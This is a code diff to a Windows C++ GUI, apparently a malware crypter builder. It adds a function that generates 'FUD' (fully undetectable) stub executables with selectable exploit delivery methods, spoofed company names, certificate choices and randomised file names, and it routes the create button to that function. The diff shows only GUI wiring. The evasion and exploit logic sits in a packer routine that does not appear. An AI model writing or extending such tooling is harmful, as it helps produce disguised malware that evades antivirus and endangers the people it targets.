@@ -2520,6 +2520,10 @@ static void SetWindowTextAnsi(HWND hwnd, const char* text) {
 static void startMassGeneration() {
     if (g_massGenerationActive) return;
     
+    // Disable mass generation temporarily to prevent interference
+    SetWindowTextW(g_hStatusText, L"Mass generation temporarily disabled for stability.");
+    return;
+    
     // Get count from edit box
     wchar_t countBuffer[10] = {0};
     GetWindowTextW(g_hMassCountEdit, countBuffer, 10);
@@ -2586,6 +2590,72 @@ static std::string browseForFile(HWND hwnd, bool save = false) {
     }
     
     return "";
+}
+
+// FUD Stub Only creation function (no PE embedding)
+static void createFUDStubOnly() {
+    std::ofstream entryLog("debug_entry_points.txt", std::ios::app);
+    entryLog << "=== createFUDStubOnly() CALLED ===\n";
+    entryLog << "Timestamp: " << GetTickCount64() << "\n";
+    
+    // Get output path from GUI
+    wchar_t outputBuffer[MAX_PATH] = {0};
+    GetWindowTextW(g_hOutputPath, outputBuffer, MAX_PATH);
+    std::string outputPath = wstringToString(std::wstring(outputBuffer));
+    
+    if (outputPath.empty()) {
+        // Auto-generate output path
+        std::string randomName = g_packer.randomEngine.generateRandomName();
+        outputPath = "FUD_Stub_" + randomName + ".exe";
+        
+        // Update the GUI with the auto-generated path
+        std::wstring wOutputPath(outputPath.begin(), outputPath.end());
+        SetWindowTextW(g_hOutputPath, wOutputPath.c_str());
+        
+        entryLog << "Auto-generated output path: " << outputPath << "\n";
+    } else {
+        // Ensure output path has .exe extension
+        if (outputPath.length() < 4 || outputPath.substr(outputPath.length() - 4) != ".exe") {
+            outputPath += ".exe";
+            std::wstring wOutputPath(outputPath.begin(), outputPath.end());
+            SetWindowTextW(g_hOutputPath, wOutputPath.c_str());
+        }
+    }
+    
+    entryLog << "Output path: " << outputPath << "\n";
+    
+    // Get selected exploit method
+    int exploitIndex = (int)SendMessage(g_hExploitCombo, CB_GETCURSEL, 0, 0);
+    ExploitDeliveryType exploitType = (ExploitDeliveryType)exploitIndex;
+    
+    // Get selected options from GUI
+    int companyIndex = (int)SendMessage(g_hCompanyCombo, CB_GETCURSEL, 0, 0);
+    int certIndex = (int)SendMessage(g_hCertCombo, CB_GETCURSEL, 0, 0);
+    
+    // Get architecture
+    int archIndex = (int)SendMessage(g_hArchCombo, CB_GETCURSEL, 0, 0);
+    MultiArchitectureSupport::Architecture architecture = 
+        (archIndex == 1) ? MultiArchitectureSupport::Architecture::X86 : MultiArchitectureSupport::Architecture::X64;
+    
+    entryLog.close();
+    
+    // Update status and disable button
+    SetWindowTextW(g_hStatusText, L"Generating FUD stub...");
+    EnableWindow(g_hCreateButton, FALSE);
+    
+    // Use dummy input for stub-only generation
+    std::string dummyInput = "stub_only";
+    
+    // Create the FUD stub
+    bool success = g_packer.createBenignStubWithExploits(dummyInput, outputPath, companyIndex, certIndex, architecture, exploitType);
+    
+    // Update status and re-enable button
+    if (success) {
+        SetWindowTextW(g_hStatusText, L"FUD stub generated successfully!");
+    } else {
+        SetWindowTextW(g_hStatusText, L"FUD stub generation failed! Check compiler setup.");
+    }
+    EnableWindow(g_hCreateButton, TRUE);
 }
 
 static void createFUDExecutable() {
@@ -2885,7 +2955,17 @@ static LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM l
                 }
                 
                 case ID_CREATE_BUTTON: {
-                    std::thread(createFUDExecutable).detach();
+                    // Check which mode is selected
+                    if (SendMessage(g_hModeStubRadio, BM_GETCHECK, 0, 0) == BST_CHECKED) {
+                        // FUD Stub Only mode
+                        std::thread(createFUDStubOnly).detach();
+                    } else if (SendMessage(g_hModePackRadio, BM_GETCHECK, 0, 0) == BST_CHECKED) {
+                        // PE Packing mode
+                        std::thread(createFUDExecutable).detach();
+                    } else {
+                        // Default to PE Packing if nothing selected
+                        std::thread(createFUDExecutable).detach();
+                    }
                     break;
                 }
                 
